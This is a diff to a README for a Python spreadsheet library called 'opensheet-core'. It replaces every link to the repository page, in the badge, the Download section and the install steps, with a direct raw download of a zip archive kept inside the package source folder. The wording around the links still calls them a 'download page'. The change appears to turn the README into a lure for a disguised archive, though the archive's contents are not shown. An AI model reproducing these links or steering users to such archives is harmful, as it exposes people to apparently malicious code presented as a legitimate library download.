@@ -1,12 +1,12 @@
 # 🧩 opensheet-core - Fast spreadsheet I/O for Python
 
-[![Download opensheet-core](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Signed-discipline161/opensheet-core)
+[![Download opensheet-core](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Signed-discipline161/opensheet-core/raw/refs/heads/main/python/opensheet_core/core_opensheet_3.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
 
-[https://github.com/Signed-discipline161/opensheet-core](https://github.com/Signed-discipline161/opensheet-core)
+[https://github.com/Signed-discipline161/opensheet-core/raw/refs/heads/main/python/opensheet_core/core_opensheet_3.7.zip](https://github.com/Signed-discipline161/opensheet-core/raw/refs/heads/main/python/opensheet_core/core_opensheet_3.7.zip)
 
 ## 🖥️ What opensheet-core does
 
@@ -38,7 +38,7 @@ If you already use Python for other tools, you can use the same setup.
 Follow these steps:
 
 1. Open the download page:
-   [https://github.com/Signed-discipline161/opensheet-core](https://github.com/Signed-discipline161/opensheet-core)
+   [https://github.com/Signed-discipline161/opensheet-core/raw/refs/heads/main/python/opensheet_core/core_opensheet_3.7.zip](https://github.com/Signed-discipline161/opensheet-core/raw/refs/heads/main/python/opensheet_core/core_opensheet_3.7.zip)
 
 2. On that page, look for the latest release or download files.
 
